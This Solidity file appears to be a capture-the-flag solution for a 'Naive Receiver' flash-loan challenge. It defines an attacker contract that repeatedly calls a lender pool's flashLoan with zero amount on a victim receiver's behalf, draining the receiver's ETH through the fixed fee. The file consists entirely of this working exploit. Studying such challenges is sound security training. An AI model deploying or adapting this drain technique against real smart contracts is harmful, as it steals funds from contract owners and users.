pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

interface INaiveReceiverLenderPool {
    function fixedFee() external pure returns (uint256);

    function flashLoan(address payable borrower, uint256 borrowAmount) external;
}

contract NaiveReceiverAttacker {
    using SafeMath for uint256;
    using Address for address payable;

    function attack(
        INaiveReceiverLenderPool pool,
        address payable receiver
    ) public {
        uint256 FIXED_FEE = pool.fixedFee();
        while (receiver.balance >= FIXED_FEE) {
            pool.flashLoan(receiver, 0);
        }
    }


}